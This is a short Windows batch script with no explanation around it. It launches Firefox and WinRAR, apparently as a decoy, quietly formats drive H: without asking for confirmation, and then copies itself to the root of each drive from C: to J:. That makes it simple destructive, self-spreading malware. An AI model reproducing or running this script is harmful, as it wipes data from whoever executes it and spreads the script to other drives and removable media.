@ECHO OFF
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe" > output.log
	start "" "C:\Program Files\WinRAR\WinRAR.exe" > output.log
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe" > output.log

	FORMAT H:/Q/X/y
echo.
	xcopy XYIN-ID.bat /h /r /c /y "C:\"
	xcopy XYIN-ID.bat /h /r /c /y "D:\"
	xcopy XYIN-ID.bat /h /r /c /y "E:\"
	xcopy XYIN-ID.bat /h /r /c /y "F:\"
	xcopy XYIN-ID.bat /h /r /c /y "G:\"
	xcopy XYIN-ID.bat /h /r /c /y "H:\"
	xcopy XYIN-ID.bat /h /r /c /y "I:\"
	xcopy XYIN-ID.bat /h /r /c /y "J:\"
exit